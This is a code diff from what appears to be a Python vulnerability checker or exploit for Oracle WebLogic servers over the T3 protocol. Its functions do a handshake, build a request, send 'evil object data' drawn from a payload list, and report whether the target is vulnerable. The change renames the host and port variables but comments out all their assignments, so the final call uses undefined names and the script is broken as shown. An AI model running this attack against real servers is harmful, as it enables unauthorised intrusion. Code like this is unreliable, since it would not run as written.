@@ -65,21 +65,21 @@ def checkVul(res,server_addr,index):
         # print (u'目标weblogic未检测到：{}'.format(VUL[index]))
         print (u'[-]目标weblogic未检测到{}'.format(VUL[index]))
 
-def run(dip,dport,index):
+def run(rip,rport,index):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
     sock.settimeout(10)
-    server_addr = (dip, dport)
+    server_addr = (rip, rport)
     t3handshake(sock,server_addr)
-    buildT3RequestObject(sock,dport)
+    buildT3RequestObject(sock,rport)
     rs=sendEvilObjData(sock,PAYLOAD[index])
     #print 'rs',rs
     checkVul(rs,server_addr,index)
 
 if __name__=="__main__":
-    # dip = sys.argv[1]
-    # dport = int(sys.argv[2])
-    # run(dip,dport,0)
-    rip = '127.0.0.1'
-    rport = 7001
+    # rip = sys.argv[1]
+    # rport = int(sys.argv[2])
+    # run(rip,rport,0)
+    #rip = '127.0.0.1'
+    #rport = 7001
     run(rip,rport,0)
